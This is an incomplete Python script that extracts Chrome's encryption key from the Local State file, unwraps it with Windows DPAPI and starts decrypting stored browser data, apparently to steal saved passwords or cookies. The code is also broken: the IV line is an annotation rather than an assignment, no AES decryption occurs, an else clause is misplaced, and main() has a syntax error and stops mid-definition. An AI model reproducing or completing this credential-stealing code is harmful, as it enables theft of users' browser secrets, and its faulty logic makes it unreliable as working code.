import os
import json
import base64
import sqlite3
import shutil
from datetime import datetime, timedelta
import win32crypt # pip install pypiwin32
from Crypto.Cipher import AES # pip install pycryptodome


def get_chrome_datetime(chromedate):
    if chromedate != 86400000000 and chromedate:
        try:
            return datetime (1601, 1, 1) + timedelta(microseconds=chromedate)
        except Exception as e:
            print(f"Error: Encountered {e}, chromedate: {chromedate}")
            return  chromedate
        else:
            return ""   
        
def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google" , "Chrome", "User Data", "Local State")
    
    with open(local_state_path, "r") as f:
        local_state = f.read()
        local_state = json.loads(local_state)    

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key [5:]
    return win32crypt.CryptUnprotectData(key, None, None , None, 0)[1]

def decrypt_data(data,key):
    try:
        iv: data[3:15]
        data = data[15:]
        
    except:
        try:
            return str(win32crypt.CryptUnprotectData(data, None,None, None,0)[1])
        except:
            return
def main():
    db_path = os.path.join(os.environ["USERPROFILE"]"AppData", "Local", "Google" , "Chrome", "User Data",)                  